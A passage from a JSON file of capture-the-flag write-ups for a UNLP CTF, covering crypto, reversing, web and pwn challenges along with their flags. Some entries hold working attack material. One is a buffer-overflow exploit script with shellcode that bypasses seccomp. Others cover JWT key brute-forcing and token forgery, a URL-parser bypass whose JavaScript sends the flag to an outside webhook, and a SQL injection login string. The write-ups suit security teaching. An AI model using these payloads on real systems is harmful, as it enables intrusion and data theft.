                "writeup": "<h3>Challenge Description</h3>\nThe challenge provided a single file named <code>blended.txt</code>. This file contained what appeared to be lines of ASCII art text, but they were scrambled (shuffled) vertically.\n<h3>Analysis</h3>\n1.  <strong>Initial Inspection</strong>: Opening <code>blended.txt</code> revealed distinct horizontal slices of large ASCII characters (FIGlet style). Some lines clearly belonged to the top of letters (e.g., starting with <code> __</code>), while others were bottom curves (e.g., <code>\\______/</code>) or middle sections with vertical bars.\n<p>2.  <strong>Reconstruction</strong>:\n<ul>\n<li>I identified the correct vertical order of the lines by analyzing the structure of standard ASCII art fonts (specifically matching top bars, middle connections, and bottom closures).</li>\n<li>The correct permutation of the lines (0-based indices from the original file) was determined to be: <code>[2, 7, 6, 1, 0, 5, 8]</code>.</li>\n<li>Applying this reordering reconstructed a readable ASCII art banner.</li>\n</ul>\n3.  <strong>Extraction</strong>:\n<ul>\n<li>The reconstructed banner spelled out a sentence.</li>\n<li>By carefully reading the ASCII characters, the text was identified as: <code>UNLP{DOYOULIKEMYGRAFFITY?}</code>.</li>\n</ul>\n4.  <strong>Flag Formulation</strong>:\n<ul>\n<li>The text \"UNLPDOYOULIKEMYGRAFFITY?\" was formatted into the standard flag structure.</li>\n</ul>\n<h3>Solution</h3>\nThe final flag is:\n<code>UNLP{DOYOULIKEMYGRAFFITY?}</code></p>\n"
            },
            {
                "id": "cinefest1-local",
                "title": "Cinefest1 local",
                "category": "Miscellaneous",
                "tags": [
                    "xor",
                    "pwn",
                    "buffer",
                    "overflow",
                    "shellcode",
                    "stack",
                    "assembly",
                    "memory"
                ],
                "writeup": "<p><strong>Protections:</strong></p>\n<ul>\n<li><strong>No Canary:</strong> Stack overflows are possible.</li>\n<li><strong>No PIE:</strong> Code segments are at fixed addresses.</li>\n<li><strong>RWX Stack:</strong> The stack is executable (we can run shellcode).</li>\n<li><strong>Seccomp:</strong> A sandbox is active. It allows standard function calls but <strong>blocks <code>syscall</code> instructions if they are executed on the stack</strong>.</li>\n</ul>\n<h4>Vulnerabilities</h4>\n<p>The binary provided two distinct input stages :</p>\n<p>1. <strong>Title Input:</strong> Vulnerable to a <strong>Format String Attack</strong>. It prints the user input directly using <code>printf</code>, allowing us to leak memory addresses (Stack and Libc pointers).</p>\n<p>2. <strong>Plot Summary Input:</strong> Vulnerable to a <strong>Buffer Overflow</strong>. It reads more data than the buffer can hold, allowing us to overwrite the Return Instruction Pointer (RIP) and jump to the stack.</p>\n<p>---</p>\n<h4>The Exploitation Path</h4>\n<p>#### 1. The Strategy: \"Syscall Proxying\"</p>\n<p>We initially tried standard shellcode (<code>open</code>/<code>read</code>/<code>write</code>), but it crashed with <code>SIGSYS</code> or <code>EOF</code>.</p>\n<ul>\n<li><strong>Diagnosis:</strong> The Seccomp filter detected that we were executing a <code>syscall</code> instruction inside the Stack memory region and killed the process.</li>\n<li><strong>Solution:</strong> We used a <strong>\"Proxy\" technique</strong>. Instead of executing the syscall ourselves, our shellcode calls the functions inside <strong>Libc</strong> (specifically <code>open</code> and <code>sendfile</code>). Since Libc is in a \"trusted\" memory region, Seccomp allows the syscall to proceed.</li>\n</ul>\n#### 2. Leaking Addresses (Bypassing ASLR)\n<p>We needed to know _where_ the Stack was (to jump to it) and _where_ Libc was (to call its functions).</p>\n<ul>\n<li><strong>Payload:</strong> <code>%p|%p|%p|%p|%p|%p|%p|%p</code></li>\n<li><strong>Result:</strong></li>\n<li><strong>6th Leak:</strong> Stack Address (pointer to our input buffer).</li>\n<li><strong>8th Leak:</strong> Libc Base Address.</li>\n<li><strong>Calculation:</strong></li>\n<li><code>Target Buffer</code> = <code>Stack Leak</code> - 848 bytes.</li>\n<li><code>Jump Target</code> = <code>Target Buffer</code> + 32 bytes (landing inside our NOP sled).</li>\n</ul>\n#### 3. Finding Function Addresses\n<p>We used GDB to find the absolute addresses of the functions we needed in the local Libc version:</p>\n<ul>\n<li><code>open</code>: <code>0x7ffff7e5ff20</code></li>\n<li><code>sendfile</code>: <code>0x7ffff7e60790</code></li>\n</ul>\n#### 4. The Shellcode Logic\n<p>We wrote custom Assembly to behave like a C program function call:</p>\n<p>1. <strong>Push String:</strong> Pushed <code>\"flag.txt\\x00\"</code> onto the stack.</p>\n<p>2. <strong>Call Open:</strong> Set <code>rdi</code> to the stack pointer (filename) and performed <code>call 0x7ffff7e5ff20</code>.</p>\n<p>3. <strong>Save FD:</strong> Saved the returned File Descriptor (RAX) into <code>r13</code>.</p>\n<p>4. <strong>Call Sendfile:</strong> Set arguments <code>(1, fd, 0, 100)</code> and performed <code>call 0x7ffff7e60790</code>. This copies the file content directly to stdout.</p>\n<p>#### 5. Solving the \"Greedy Read\" Issue</p>\n<p>During debugging, we realized the first input (<code>read</code>) was consuming bytes intended for the second input because we piped the file.</p>\n<ul>\n<li><strong>Fix:</strong> We padded the \"Title\" payload to exactly <strong>127 bytes</strong>. This forced the first <code>read</code> to stop exactly at the boundary, preserving our shellcode for the second <code>read</code>.</li>\n</ul>\n---\n<h4>The Final Local Exploit Script (<code>gen.py</code>)</h4>\n<p>This script generates the <code>exploit.in</code> file that successfully retrieves the flag locally.</p>\n<p>Python</p>\n<pre><code class=\"\">from pwn import *\n<p>&lt;h2&gt;1. Addresses found via GDB Manual Debugging&lt;/h2&gt;\n&lt;h2&gt;------------------------------------------------&lt;/h2&gt;\nstack_leak = 0x7fffffffd690      # 6th leak from %p\nlibc_base  = 0x7ffff7fc6000      # 8th leak from %p\naddr_open  = 0x7ffff7e5ff20      # GDB: p open\naddr_sendfile = 0x7ffff7e60790   # GDB: p sendfile</p>\n<p>&lt;h2&gt;2. Calculations&lt;/h2&gt;\n&lt;h2&gt;------------------------------------------------&lt;/h2&gt;\n&lt;h2&gt;Jump 32 bytes into the buffer to hit the NOP sled safely&lt;/h2&gt;\njump_target = (stack_leak - 848) + 32</p>\n<p>&lt;h2&gt;3. Shellcode: The \"Syscall Proxy\"&lt;/h2&gt;\n&lt;h2&gt;------------------------------------------------&lt;/h2&gt;\n&lt;h2&gt;We use RCX for the 4th argument because we are calling functions, not syscalls.&lt;/h2&gt;\nshellcode_src = f\"\"\"\n    /* Push 'flag.txt\\\\x00' */\n    xor rax, rax\n    push rax\n    mov rax, 0x7478742e67616c66\n    push rax</p>\n<p>/* open(rsp, 0, 0) */\n    mov rdi, rsp         /* arg1: filename */\n    xor rsi, rsi         /* arg2: flags */\n    xor rdx, rdx         /* arg3: mode */\n    mov r12, {addr_open}\n    call r12\n    mov r13, rax         /* Save FD */</p>\n<p>/* sendfile(1, fd, 0, 100) */\n    mov rdi, 1           /* arg1: stdout */\n    mov rsi, r13         /* arg2: fd */\n    xor rdx, rdx         /* arg3: offset */\n    mov rcx, 100         /* arg4: count */\n    mov r12, {addr_sendfile}\n    call r12</p>\n<p>/* Infinite loop to prevent crash */\n    jmp $\n\"\"\"</p>\n<p>context.arch = 'amd64'\nshellcode = asm(shellcode_src)</p>\n<p>&lt;h2&gt;4. Construct Payload&lt;/h2&gt;\n&lt;h2&gt;------------------------------------------------&lt;/h2&gt;\n&lt;h2&gt;Pad Input 1 to 127 bytes to handle the greedy read()&lt;/h2&gt;\nfmt_str = b'%p|' * 8\npad_1   = b'.' * (127 - len(fmt_str))\ninput_1 = fmt_str + pad_1</p>\n<p>&lt;h2&gt;Exploit Buffer&lt;/h2&gt;\nnop_sled = b'\\x90' * 64\npadding  = b'A' * (280 - len(nop_sled) - len(shellcode))\nexploit  = nop_sled + shellcode + padding + p64(jump_target)</p>\n<p>&lt;h2&gt;Combine&lt;/h2&gt;\nfull_payload = input_1 + exploit</p>\n<p>&lt;h2&gt;Save&lt;/h2&gt;\nwith open('exploit.in', 'wb') as f:\n    f.write(full_payload)</p>\n<p>print(f\"[+] Local exploit generated. Target: {hex(jump_target)}\")\n</code></pre></p>\n<h4>Execution</h4>\n<p>1. Run <code>python3 gen.py</code>.</p>\n<p>2. Run <code>gdb ./director_easy</code>.</p>\n<p>3. Inside GDB: <code>run < exploit.in</code>.</p>\n<p>4. <strong>Result:</strong> <code>UNLP{fakeflag}</code> printed to stdout!</p>\n"
            },
            {
                "id": "dexter",
                "title": "Dexter",
                "category": "Web Exploitation",
                "tags": [
                    "flask",
                    "jwt"
                ],
                "writeup": "<p>The challenge \"dexter\" involved a Flask application using JWT for authentication. The vulnerability lay in the weak generation of the <code>secret_key</code>. The key was generated using <code>random.randint</code> seeded with a value that itself came from <code>random.randint(0, 2000)</code>. This effectively reduced the possible key space to only 2001 possibilities, making it trivial to brute-force.</p>\n<p>I solved the challenge by:\n1.  <strong>Analyzing the Source Code:</strong> I identified the weak seed generation logic in <code>app.py</code>.\n2.  <strong>Fetching a Valid Token:</strong> I made a request to the server to obtain a valid JWT signed with the active secret key.\n3.  <strong>Brute-Forcing the Key:</strong> I wrote a Python script to iterate through all 2001 possible seeds, generating the corresponding keys and attempting to verify the server's token.\n4.  <strong>Forging a Token:</strong> Once the correct key (<code>Rem1xKey86426418499</code>) was found, I forged a new JWT with the payload <code>{\"role\": \"superuser\", \"user\": \"admin\"}</code>.\n5.  <strong>Retrieving the Flag:</strong> I used the forged token to authenticate with the server and retrieve the flag.</p>\n<p><strong>Flag:</strong> `UNLP{R34llY-ur-Us1ng-Ai_for_th1s-B4by-Ch4ll3ng3?}</p>\n"
            },
            {
                "id": "el-angel-exterminador",
                "title": "El angel exterminador",
                "category": "Cryptography",
                "tags": [
                    "xor",
                    "image"
                ],
                "writeup": "<p><strong>Challenge Description:</strong>\nThe challenge presented a file named <code>flag.png.xor</code>, suggesting an XOR encryption. The objective was to decrypt this file to obtain the flag.</p>\n<p><strong>Solution Steps:</strong></p>\n<p>1.  <strong>Initial Analysis:</strong>\n    The presence of the <code>.xor</code> extension indicated a likely XOR encryption. The original file was presumed to be <code>flag.png</code>.</p>\n<p>2.  <strong>Identifying PNG Signature:</strong>\n    PNG files have a standard 8-byte signature: <code>89 50 4E 47 0D 0A 1A 0A</code>. This knowledge is crucial for a known-plaintext attack.</p>\n<p>3.  <strong>Inspecting the Encrypted File:</strong>\n    The first 32 bytes of <code>flag.png.xor</code> were extracted using <code>xxd</code>:\n    <code>dc 1e 02 17 3f 3a 28 3f 21 55 4e 41 19 7a 74 60 35 21 54 62 4c 50 33 f2 3a 37 21 55 4e 96 01 51</code></p>\n<p>4.  <strong>XOR Key Derivation (Known-Plaintext Attack):</strong>\n    By XORing the first 8 bytes of <code>flag.png.xor</code> with the PNG signature, the initial part of the XOR key was revealed:\n    <code>dc ^ 89 = 55 ('U')</code>\n    <code>1e ^ 50 = 4e ('N')</code>\n    <code>02 ^ 4e = 4c ('L')</code>\n    <code>17 ^ 47 = 50 ('P')</code>\n    <code>3f ^ 0d = 32 ('2')</code>\n    <code>3a ^ 0a = 30 ('0')</code>\n    <code>28 ^ 1a = 32 ('2')</code>\n    <code>3f ^ 0a = 35 ('5')</code>\n    This resulted in <code>UNLP2025</code>.</p>\n<p>Further analysis of the subsequent bytes, specifically the expected <code>IHDR</code> chunk type (<code>49 48 44 52</code>) after the PNG signature, helped confirm and extend the key. The pattern <code>UNLP2025</code> followed by <code>!</code> and then a repeat of <code>UNLP202</code> strongly suggested the key was <code>UNLP2025!</code>.</p>\n<p>5.  <strong>Decryption Script:</strong>\n    A Python script (<code>decrypt.py</code>) was created to perform the XOR decryption:</p>\n<pre><code class=\"python\">    def xor_decrypt(input_path, output_path, key):\n        with open(input_path, 'rb') as f_in, open(output_path, 'wb') as f_out:\n            data = f_in.read()\n            key_len = len(key)\n            decrypted_data = bytearray()\n<p>for i in range(len(data)):\n                decrypted_data.append(data[i] ^ key[i % key_len])</p>\n<p>f_out.write(decrypted_data)</p>\n<p>if __name__ == \"__main__\":\n        key = b\"UNLP2025!\" # Derived key\n        xor_decrypt(\"flag.png.xor\", \"flag.png\", key)\n        print(\"Decryption complete. Saved to flag.png\")\n    </code></pre></p>\n<p>6.  <strong>Executing the Decryption:</strong>\n    The script was executed, successfully creating <code>flag.png</code>.</p>\n<p>7.  <strong>Verification:</strong>\n    The <code>file</code> command confirmed that <code>flag.png</code> was a valid PNG image:\n    <code>flag.png: PNG image data, 300 x 450, 8-bit/color RGB, non-interlaced</code></p>\n<p>8.  <strong>Flag Retrieval:</strong>\n    The decrypted <code>flag.png</code> image, when opened, revealed the flag visually.</p>\n<p><strong>The Flag:</strong>\n<code>UNLP{f4th3r0fsurrealism!}</code></p>\n"
            },
            {
                "id": "final-cut",
                "title": "Final Cut",
                "category": "Reverse Engineering",
                "tags": [
                    "crypto",
                    "aes",
                    "cipher",
                    "buffer",
                    "ghidra"
                ],
                "writeup": "<h3>Overview</h3>\nThe challenge provided a 64-bit ELF binary <code>final_cut</code>. When executed, it displayed a \"Rendering\" message and attempted to calculate an \"Optimal Cut Score\" before hanging indefinitely. The goal was to recover the flag, which was encrypted within the binary.\n<h3>Analysis</h3>\n<h4>Static Analysis</h4>\nUsing <code>file</code> and <code>strings</code>, we identified it as a standard Linux executable. Strings like \"AES-128 Decryption Projector\", \"Projector Malfunction: Key Error\", and \"Calculating optimal cut\" suggested that the program was performing a calculation to derive a decryption key.\n<p>Disassembling with <code>objdump</code> (or using a decompiler like Ghidra/IDA) revealed the main logic:\n1.  <strong>Data loading</strong>: The program loads two arrays of integers from the <code>.rodata</code> section. These correspond to \"weights\" (runtime) and \"values\" (scene score).\n2.  <strong>Knapsack Problem</strong>: The \"Calculating optimal cut\" phase implements a recursive solution to the 0/1 Knapsack Problem.\n<ul>\n<li>  Capacity (Max Runtime): 240</li>\n<li>  Number of items (Scenes): 100</li>\n<li>  The recursive implementation has exponential time complexity O(2^n), causing the program to hang.</li>\n</ul>\n3.  <strong>Key Generation</strong>: The result of this calculation (the optimal score) is used to construct an AES-128 key.\n<ul>\n<li>  The key buffer is 16 bytes initialized to zero.</li>\n<li>  The 64-bit integer result is written to the first 8 bytes (little-endian).</li>\n</ul>\n4.  <strong>Decryption</strong>: The binary uses OpenSSL's <code>AES_decrypt</code> (ECB mode) to decrypt a stored blob of data using the generated key.</p>\n<h4>Extraction</h4>\nWe identified the offsets for the relevant data structures in the binary:\n<ul>\n<li>  <strong>Weights Array</strong>: Offset <code>0x2020</code> (Size: 100 integers)</li>\n<li>  <strong>Values Array</strong>: Offset <code>0x21C0</code> (Size: 100 integers)</li>\n<li>  <strong>Encrypted Flag</strong>: Offset <code>0x2360</code> (Size: 48 bytes)</li>\n</ul>\n<h3>Solution</h3>\n<p>Instead of waiting for the slow recursive algorithm to finish, we implemented the Knapsack solver using Dynamic Programming (DP). This reduces the complexity to O(n * W), which runs instantly.</p>\n<h4>Script (<code>solve.py</code>)</h4>\n<pre><code class=\"python\">import struct\nfrom Crypto.Cipher import AES\n<p>def solve():\n    with open('final_cut', 'rb') as f:\n        # Extract Weights\n        f.seek(0x2020)\n        weights_data = f.read(400) # 100 integers * 4 bytes\n        weights = struct.unpack('&lt;100i', weights_data)</p>\n<p># Extract Values\n        f.seek(0x21C0)\n        values_data = f.read(400)\n        values = struct.unpack('&lt;100i', values_data)\n                                                                                                    # Extract Encrypted Flag                                                                    f.seek(0x2360)\n        encrypted_flag = f.read(48)</p>\n<p>capacity = 240                                                                              n = 100</p>\n<p># Knapsack Dynamic Programming Solution\n    # dp[w] = max value with capacity w\n    dp = [0] * (capacity + 1)</p>\n<p>for i in range(n):\n        w = weights[i]\n        v = values[i]                                                                               for j in range(capacity, w - 1, -1):                                                            dp[j] = max(dp[j], dp[j-w] + v)\n    optimal_score = dp[capacity]\n    print(f\"Optimal Score: {optimal_score}\")</p>\n<p># Construct Key\n    # Key is 16 bytes: [Score (8 bytes)][Zero Padding (8 bytes)]\n    key = struct.pack('&lt;Q', optimal_score) + b'\\x00' * 8</p>\n<p>print(f\"Key (hex): {key.hex()}\")</p>\n<p># Decrypt\n    try:                                                                                            cipher = AES.new(key, AES.MODE_ECB)                                                         decrypted = cipher.decrypt(encrypted_flag)                                                  print(f\"Decrypted: {decrypted.decode('utf-8', errors='ignore')}\")\n    except Exception as e:\n        print(f\"Decryption failed: {e}\")                                                                                                                                                if __name__ == \"__main__\":\n    solve()\n</code></pre></p>\n<h3>Result</h3>\nRunning the script yields the optimal score and decrypts the flag:\n<ul>\n<li>  <strong>Optimal Score</strong>: <code>17452999</code></li>\n<li>  <strong>Key</strong>: <code>c74f0a01000000000000000000000000</code></li>\n<li>  <strong>Flag</strong>: <code>UNLP{DyNam1C_Pr0gRamm1nG_w1Ns_0sC4rs}</code></li>\n</ul>\n"
            },
            {
                "id": "fragmented-flags",
                "title": "Fragmented Flags",
                "category": "Miscellaneous",
                "tags": [
                    "web"
                ],
                "writeup": "<p>The flag was fragmented into three parts and hidden in different files on the website.</p>\n<p>1.  <strong>First Fragment: <code>UNLP{1_dOnt_like_</code></strong>\n<ul>\n<li>  <strong>Location:</strong> Found in the <code>index.html</code> file's <code><meta name=\"description\" ...></code> tag.</li>\n<li>  <strong>Discovery Method:</strong> Retrieved the <code>index.html</code> content using <code>curl</code> and inspected the source.</li>\n</ul>\n2.  <strong>Second Fragment: <code>the_TEG_map_|_prefer_</code></strong>\n<ul>\n<li>  <strong>Location:</strong> Hidden within a CSS comment in the <code>style.css</code> file.</li>\n<li>  <strong>Discovery Method:</strong> Identified <code>style.css</code> as a linked resource in <code>index.html</code>, then fetched its content using <code>curl</code> and examined the file.</li>\n</ul>\n3.  <strong>Third Fragment: <code>the_Bor3d_Grid}</code></strong>\n<ul>\n<li>  <strong>Location:</strong> Found directly in the <code>main.js</code> file.</li>\n<li>  <strong>Discovery Method:</strong> Identified <code>main.js</code> as a linked resource in <code>index.html</code>, then fetched its content using <code>curl</code> and found the fragment.</li>\n</ul>\n<strong>Full Flag:</strong>\nCombining all three fragments yields the complete flag:\n<code>UNLP{1_dOnt_like_the_TEG_map_|_prefer_the_Bor3d_Grid}</code></p>\n"
            },
            {
                "id": "irreversible",
                "title": "Irreversible",
                "category": "Web Exploitation",
                "tags": [
                    "web",
                    "http"
                ],
                "writeup": "<h3>Vulnerability Analysis</h3>\nThe core logic resides in <code>app.py</code>. The application allows users to specify a <code>domain</code> to send the flag to, but it enforces a strict check:\n<pre><code class=\"python\">ALLOWED_DOMAIN = \"https://ctf.cert.unlp.edu.ar\"\n...\ntarget_domain = request.form.get('domain', '')\nif not target_domain.startswith(ALLOWED_DOMAIN):\n    return jsonify({\"error\": \"Invalid URL\"}), 400\n</code></pre>\n<p>If the check passes, the application sends a POST request containing the flag:</p>\n<pre><code class=\"python\">requests.post(\n    f\"{url}/irreversible_receiver\",\n    ...\n    headers={\"Flag\": flag}\n)\n</code></pre>\n<h4>The Exploit</h4>\nThe <code>startswith</code> check is insufficient because standard URL parsing (and the Python <code>requests</code> library) supports <strong>Basic Authentication</strong> in the format <code>scheme://user:password@host</code>.\n<p>We can construct a URL that satisfies the <code>startswith</code> check but directs the traffic to a server we control:\n<code>https://ctf.cert.unlp.edu.ar@our-webhook.com</code></p>\n<p>In this URL:                                                                                - <code>https://</code> is the scheme.                                                                 - <code>ctf.cert.unlp.edu.ar</code> is interpreted as the <strong>username</strong>.\n<ul>\n<li><code>@</code> acts as the delimiter.</li>\n<li><code>our-webhook.com</code> is the actual <strong>destination host</strong>.</li>\n</ul>\n<h3>Exploitation Steps</h3></p>\n<p>1.  <strong>Setup a Listener:</strong>\n    We need a public endpoint to receive the HTTP request. Services like <code>webhook.site</code> or <code>requestcatcher.com</code> work perfectly for this. Let's assume our webhook URL is <code>https://webhook.site/UUID</code>.</p>\n<p>2.  <strong>Bypass ReCaptcha:</strong>\n    The remote server implements Google ReCaptcha. Since the ReCaptcha token is tied to the solver's session/IP, we cannot easily use <code>curl</code> from a different machine/server. The easiest way is to execute the exploit directly in the browser's developer console after solving the captcha manually.</p>\n<p>3.  <strong>Execution:</strong>\n<ul>\n<li>Open the challenge URL (<code>https://flagsender.ctf.cert.unlp.edu.ar/</code>) in a browser.</li>\n<li>Open Developer Tools (F12) and go to the Console tab.                                     - <strong>Solve the ReCaptcha</strong> on the page (click the checkbox).                                 - <strong>Immediately</strong> run the following JavaScript code in the console:</li>\n</ul>\n    <pre><code class=\"javascript\">    // Get the fresh token from the just-solved captcha          \n    const token = grecaptcha.getResponse();</p>\n<p>// Construct the malicious payload\n    // Format: https://ctf.cert.unlp.edu.ar @ YOUR_WEBHOOK\n    const attackerUrl = \"https://ctf.cert.unlp.edu.ar@webhook.site/YOUR-UUID-HERE\";</p>\n<p>const formData = new FormData();\n    formData.append(\"domain\", attackerUrl);\n    formData.append(\"g-recaptcha-response\", token);</p>\n<p>// Send the request\n    fetch(\"/send_flag\", {method: \"POST\",body: formData})\n    .then(r =&gt; r.json()).then(console.log)\n    .catch(console.error);\n    </code></pre></p>\n<p>4.  <strong>Retrieve Flag:</strong>\n    Check the webhook listener. A POST request will arrive with the flag in the HTTP Headers.                                                                                                                                    <strong>Header:</strong> <code>Flag: UNLP{ohH-bYp4ss-UrLP4rs3rs-1s-My-p4Ss10n}</code></p>\n<h3>Flag:<code>UNLP{ohH-bYp4ss-UrLP4rs3rs-1s-My-p4Ss10n}</code></h3>\n"
            },
            {
                "id": "mandatory-zelda-challenge",
                "title": "Mandatory Zelda Challenge",
                "category": "Miscellaneous",
                "tags": [],
                "writeup": "<p>Second part can be found from git commit history</p>\n<p>YeArz_th1s_Gam3_R0ckz!!!}</p>\n<p>First part can be found from waybackmachine\nUNLP{Ev3n_4Fter_34_</p>\n<h3>Flag: <code>UNLP{Ev3n_4Fter_34_YeArz_th1s_Gam3_R0ckz!!!}</code></h3>\n"
            },
            {
                "id": "manhattan",
                "title": "Manhattan",
                "category": "Miscellaneous",
                "tags": [],
                "writeup": "<p>beginner\nJust use strings\nUNLP{St3g4n0graphy_15_fUn}</p>\n"
            },
            {
                "id": "parasite",
                "title": "Parasite",
                "category": "Cryptography",
                "tags": [
                    "cipher",
                    "xor",
                    "rop"
                ],
                "writeup": "<h3>Challenge Description</h3>\nWe are provided with a file <code>mtp.txt</code> containing 10 lines of hex-encoded strings. The title \"Parasite\" and the file name <code>mtp.txt</code> strongly suggest a <strong>Many Time Pad</strong> attack on a stream cipher (like OTP where the key is reused).\n<h3>Analysis</h3>\nIn a stream cipher, encryption is performed by XORing the plaintext ($P$) with a key ($K$):\n$$C = P \\oplus K$$\n<p>If the key is reused for multiple messages (as implied by \"MTP\"), we have:\n$$C_1 = P_1 \\oplus K$$\n$$C_2 = P_2 \\oplus K$$</p>\n<p>XORing two ciphertexts eliminates the key:\n$$C_1 \\oplus C_2 = (P_1 \\oplus K) \\oplus (P_2 \\oplus K) = P_1 \\oplus P_2$$</p>\n<p>The result is the XOR sum of the two plaintexts. Since the plaintexts are English text (likely ASCII), we can exploit statistical properties to recover them. For example, the space character (<code>0x20</code>) is very frequent. If $P_1$ has a space at index $i$, then:\n$$(C_1 \\oplus C_2)[i] = \\text{space} \\oplus P_2[i] = 0x20 \\oplus P_2[i]$$\nXORing an ASCII letter with <code>0x20</code> typically flips its case. This allows us to identify probable spaces and recover the corresponding characters in other messages.</p>\n<h3>Solution Steps</h3>\n<p>1.  <strong>Initial Data Extraction</strong>: We read the hex-encoded lines from <code>mtp.txt</code>.\n2.  <strong>Automated Analysis</strong>: We wrote a script (<code>solve_best.py</code>) that implements a beam search algorithm.\n<ul>\n<li>  It iterates through each byte position.</li>\n<li>  For each position, it tries all possible key bytes (0x00-0xFF).</li>\n<li>  It decrypts that byte for all 10 messages.</li>\n<li>  It scores the \"validity\" of the decrypted characters based on English letter frequency and printable ASCII range.</li>\n<li>  The algorithm keeps the \"best\" partial keys and extends them.</li>\n</ul>\n3.  <strong>Partial Key Recovery</strong>: The script successfully recovered the beginning of the key: <code>554e4c507b...</code> which decodes to <code>UNLP{</code>. This confirms the key is the flag itself.\n4.  <strong>Contextual Refinement</strong>:\n<ul>\n<li>  The recovered text fragments looked like dialogue.</li>\n<li>  Msg 0: <code>You know what kind of plan n...</code></li>\n<li>  Msg 1: <code> No plan at all. You know w...</code></li>\n<li>  Searching these phrases online identified them as quotes from the movie <strong>Parasite</strong> (specifically the father's monologue about \"no plan\").</li>\n</ul>\n5.  <strong>Completing the Flag</strong>:\n<ul>\n<li>  The recovered text fragments looked like dialogue.</li>\n<li>  We continued to refine the key by guessing the next words in the famous monologue (\"Because life cannot be planned\", \"sleeping together on the floor\", etc.).</li>\n<li>  We used a script <code>test_key.py</code> to test our guesses for the flag (Key).</li>\n<li>  The guess <code>UNLP{we_4llLiv3inTheS4m3CountryCall3dCapitalism}</code> resulted in perfectly readable text for all 10 lines.</li>\n</ul>\n<h3>Recovered Messages</h3>\n0. <code>You know what kind of plan never fails? No plan.</code>\n1. <code> No plan at all. You know why? Because life cann</code>\n2. <code>ot be planned. Look around you. Did you think th</code>\n3. <code>ese people made a plan to sleep in the sports ha</code>\n4. <code>ll with you? But here we are now, sleeping toget</code>\n5. <code>her on the floor. So, there's no need for a plan</code>\n6. <code>. You can't go wrong with no plans. We don't nee</code>\n7. <code>d to make a plan for anything. It doesn't matter</code>\n8. <code> what will happen next. Even if the country gets</code>\n9. <code> destroyed or sold out, nobody cares. Got it?</code></p>\n<h3>Final Flag</h3>\n<code>UNLP{we_4llLiv3inTheS4m3CountryCall3dCapitalism}</code>\n"
            },
            {
                "id": "tron",
                "title": "TRON",
                "category": "Miscellaneous",
                "tags": [
                    "sql"
                ],
                "writeup": "<p>Beginner</p>\n<p>login to the page using username as ' OR 1=1--</p>\n<p>Flag: UNLP{W3lc0m3_t0_SQL1_C7F!}</p>\n"
            },
            {
                "id": "titanic",
                "title": "Titanic",
                "category": "Miscellaneous",
                "tags": [
                    "aes",
                    "http",
                    "reverse"
                ],
                "writeup": "<p>beginner\n<h3>1. Initial Analysis</h3></p>\n<p>We were provided with a file named <code>script.cpython-312.pyc</code>. The extension <code>.pyc</code> indicates this is a <strong>compiled Python bytecode file</strong>, meaning it is not human-readable source code but rather the intermediate bytecode that the Python interpreter executes.</p>\n<p>To understand the logic, we needed to decompile it back into readable Python source code.</p>\n<h3>2. Decompilation</h3>\n<p>Since <code>.pyc</code> files contain bytecode, we used an online decompiler tool to reverse the compilation process.</p>\n<ul>\n<li><strong>Tool Used:</strong> <a href=\"https://pylingual.io\" target=\"_blank\">pylingual.io</a></li>\n<li><strong>Action:</strong> Uploaded <code>script.cpython-312.pyc</code>.</li>\n<li><strong>Result:</strong> Recovered the original source code, revealing the logic for password validation and AES decryption.</li>\n</ul>\n<h3>3. Code Analysis</h3>\n<p>The decompiled script revealed two main components: a password checker and a decryption function.</p>\n<h4>The Password Checker</h4>\n<p>The script prompts for a password (<code>s</code>) and validates it using the <code>check(s)</code> function:</p>\n<p>Python</p>\n<pre><code class=\"\">y = 's4Pd'\n<p>def check(s):\n    z = '0w5' + y + 'r'                 # Constructs target string z\n    x = (s[6:8] + s[0:3] + s[3:6])[::-1]  # Shuffles and reverses input s\n    return x == z\n</code></pre></p>\n<ul>\n<li><strong>Target Construction (<code>z</code>):</strong> The variable <code>y</code> is <code>'s4Pd'</code>. <code>z</code> is constructed as <code>'0w5' + 's4Pd' + 'r'</code>, resulting in: <code>z = '0w5s4Pdr'</code></li>\n<li><strong>Input Transformation (<code>x</code>):</strong> The input <code>s</code> is sliced into three parts, reordered, and then the entire string is reversed. To pass the check, the transformed input <code>x</code> must match <code>z</code>.</li>\n</ul>\n<h4>The Decryption Routine</h4>\n<p>If the password is correct, the script uses it to decrypt a hidden hex string:</p>\n<p>Python</p>\n<pre><code class=\"\">def get_secret(k):\n    # ... (hex string) ...\n    key = (k * 2).encode('utf-8')        # Key is password repeated twice\n    iv = b'thisIsNotTheFlag'             # Hardcoded IV\n    aes = AES.new(key, AES.MODE_CBC, iv)\n    return aes.decrypt(secret)\n</code></pre>\n<h3>4. Solving the Logic</h3>\n<p>To find the correct password, we reversed the operations performed in the <code>check(s)</code> function:</p>\n<p>1. <strong>Target String:</strong> <code>'0w5s4Pdr'</code></p>\n<p>2. <strong>Reverse It:</strong> The code does <code>[::-1]</code>, so we reverse <code>z</code> to get the pre-reversed state: <code>'rdP4s5w0'</code></p>\n<p>3. <strong>Un-shuffle:</strong> The code arranged the input as <code>Index[6:8] + Index[0:3] + Index[3:6]</code>. We map the reversed string back to these slots:</p>\n<ul>\n<li><code>s[6:8]</code> (Last 2 chars) = <code>'rd'</code></li>\n<li><code>s[0:3]</code> (First 3 chars) = <code>'P4s'</code></li>\n<li><code>s[3:6]</code> (Middle 3 chars) = <code>'5w0'</code></li>\n</ul>\ncombining these in order (<code>0-3</code>, <code>3-6</code>, <code>6-8</code>) gave us the password: <strong><code>P4s5w0rd</code></strong>.\n<h3>5. Capturing the Flag</h3>\n<p>With the password recovered, we had two options: run the script or write a solver. We ran the script and provided the input:</p>\n<p>Plaintext</p>\n<pre><code class=\"\">Password: P4s5w0rd\n</code></pre>\n<p>The script successfully authenticated the user and decrypted the AES string using the derived key.</p>\n<p><strong>Final Flag:</strong> <code>UNLP{w3lc0m3-B4by-R3vers3r}</code></p>\n"
            },
            {
                "id": "weird-pcap",
                "title": "Weird PCAP",
                "category": "Miscellaneous",
                "tags": [
                    "reverse",
                    "pcap",
                    "shark"
                ],
